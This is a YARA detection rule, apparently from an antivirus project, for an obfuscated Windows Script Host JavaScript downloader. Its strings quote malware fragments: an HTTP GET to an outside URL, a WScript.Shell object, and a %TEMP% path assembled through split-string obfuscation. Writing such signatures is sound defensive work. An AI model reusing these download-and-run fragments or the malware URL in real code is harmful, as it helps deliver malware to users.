rule sig_20160427_e5c448a95004c6751c38b24270cdecac {
  meta:
    description = "datamaliciousorder - file 20160427_e5c448a95004c6751c38b24270cdecac.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5f4a3057eefbebcb2e36c1f15b68d0fb57143302b487d34d1c00fbdc43889a5d"

  strings:
    $s1  = "VhlsrBksco[HldtuYedfk](\"G\" + \"ET\", \"http://totaltransport.com.br/n7dus\", false);" fullword ascii
    $s2  = "function YumuqWomgm() {return HrzwvWzbef[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ZF4uPNj" ascii
    $s3  = "function YumuqWomgm() {return HrzwvWzbef[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ZF4uPNj" ascii
    $s4  = "var HrzwvWzbef = function CmhjtSdoas() {return RudxzLiipk[ZoytqLdfol](\"WScript\"+\".Shell\");}(), SzmxiHhkkx = 11;" fullword ascii
    $s5  = "function PohegSbsrc(YldwzXatlj, ObnbsXzmgr){WvyofWarlr = WvyofWarlr * 1; return YldwzXatlj - ObnbsXzmgr;};" fullword ascii
    $s6  = "var RudxzLiipk = this[\"WScript\"];" fullword ascii
    $s7  = "function EahzcToatf(){return AzqvmSehdj + \"\";};" fullword ascii
    $s8  = "if (VhlsrBksco[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function HzpboWyvpm() {return ((IjujmVdmvp == true) && (IjujmVdmvp == GzlrfThdws)) ? 1 : WvyofWarlr;};" fullword ascii
    $s10 = "}while (DryxrNrsoh);" fullword ascii
    $s11 = "function KvobbMtoqx(){return ZoytqLdfol;};" fullword ascii
    $s12 = "IjujmVdmvp = true; " fullword ascii
    $s13 = "var EddplGhfad = new this[\"D\"+\"ate\"]();" fullword ascii
    $s14 = "var EuwjmDzhze = false;" fullword ascii
    $s15 = "function IedahPzcfm()" fullword ascii
    $s16 = "GzlrfThdws = true; " fullword ascii
    $s17 = "EuwjmDzhze = true;" fullword ascii
    $s18 = "var IjujmVdmvp = false;" fullword ascii
    $s19 = "function NovgvXjbew(QjzrdCerqm) {var KmqysDgmhl = (1, 2, 3, 4, 5, QjzrdCerqm); return KmqysDgmhl;};" fullword ascii
    $s20 = "function CwtnlSfjyb(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}